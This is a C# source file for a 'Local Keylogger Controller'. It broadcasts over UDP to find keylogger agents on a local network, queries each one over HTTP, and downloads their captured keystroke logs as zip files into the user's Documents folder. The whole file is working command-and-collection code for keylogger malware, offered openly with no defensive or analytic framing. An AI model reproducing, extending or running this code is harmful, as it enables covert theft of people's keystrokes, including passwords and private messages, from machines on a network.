using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.IO;


namespace Local_Keylogger_Controller
{
    internal class Program
    {
        private const string version = "1.0.0";

        public const int DiscoveryPort = 5001;
        private const string DiscoveryMessage = "DISCOVER_AGENT";
        private const uint ReciveTimeoutMs = 5000; // 5 seconds

        static async Task Main(string[] args)
        {
            Console.WriteLine($"Starting Local Keylogger Controller, Version: {version}\nMade by ArGul, GitHub: https://github.com/ArGul-0/Local-Keylogger-Controller");

            using UdpClient udpClient = new UdpClient();
            udpClient.EnableBroadcast = true;

            byte[] payload = Encoding.UTF8.GetBytes(DiscoveryMessage);
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Broadcast, DiscoveryPort);

            await udpClient.SendAsync(payload, payload.Length, endPoint);
            Console.WriteLine($"Discovery message sent to {endPoint.Address} : {DiscoveryPort}");

            var discoveryAgents = new List<(string Ip, int Port)>();
            var startTime = DateTime.UtcNow;

            Console.WriteLine($"Waiting for responses from agents for {ReciveTimeoutMs} ms...");

            while ((DateTime.UtcNow - startTime).TotalMilliseconds < ReciveTimeoutMs)
            {
                var timeLeft = ReciveTimeoutMs - (int)(DateTime.UtcNow - startTime).TotalMilliseconds;
                if(timeLeft <= 0) break;

                var receiveTask = udpClient.ReceiveAsync();
                var timeoutTask = Task.Delay((int)timeLeft);

                var completedTask = await Task.WhenAny(receiveTask, timeoutTask);
                if(completedTask == timeoutTask)
                {
                    Console.WriteLine("No more responses received, exiting...");
                    break;
                }

                // If we received a response, process it
                var rusults = receiveTask.Result;
                string text = System.Text.Encoding.UTF8.GetString(rusults.Buffer);
                Console.WriteLine($"Received response from {rusults.RemoteEndPoint.Address} : {rusults.RemoteEndPoint.Port} - {text}");
            
                var parts = text.Split(':');
                if(parts.Length == 3 && parts[0].Trim() == "AGENT_RESPONSE")
                {
                    string ipPart = parts[1].Trim();
                    string portPart = parts[2].Trim()
                        .Replace("Port", "")
                        .Trim();

                    if(int.TryParse(portPart, out int port))
                    {
                        discoveryAgents.Add((ipPart, port));
                        Console.WriteLine($"Discovered agent at {ipPart} : {port}");
                    }
                    else
                    {
                        Console.WriteLine($"Invalid port received: {portPart}");
                    }
                }
                else
                {
                    Console.WriteLine($"Invalid response format: {text}");
                }
            }

            if(discoveryAgents.Count == 0)
            {
                Console.WriteLine("No agents discovered.");
                return;
            }
            else
            {
                Console.WriteLine($"Discovered {discoveryAgents.Count} agents:");
                foreach (var agent in discoveryAgents)
                {
                    Console.WriteLine($"- {agent.Ip} : {agent.Port}");
                }

                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(2)})
                {
                    foreach (var agent in discoveryAgents)
                    {
                        var url = $"http://{agent.Ip}:{agent.Port}/?action=info";
                        Console.Write($"-> {agent.Ip} : {agent.Port} - Sending start command... ");

                        try
                        {
                            string response = await client.GetStringAsync(url);
                            Console.WriteLine($"OK: \"{response}\"");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error sending command to {agent.Ip} : {agent.Port} - {ex.Message}");
                        }
                    }
                    foreach ( var (ip, port) in discoveryAgents)
                    {
                        var url = $"http://{ip}:{port}/?action=getkeylogs";
                        Console.Write($"-> {ip} : {port} - Sending get key log... ");

                        try
                        {
                            byte[] zipBytes = await client.GetByteArrayAsync(url);

                            string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                            string filePatch = Path.Combine(documents, $"keylog_{ip.Replace(".","_")}_{port}.zip");

                            File.WriteAllBytes(filePatch, zipBytes);
                            Console.WriteLine($"OK: Key logs saved to {filePatch}");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error sending command to {ip} : {port} - {ex.Message}");
                        }
                    }
                }
            }

            Console.WriteLine("\nController work complete. Press Enter to exit.");
            Console.ReadLine();
        }
    }
}
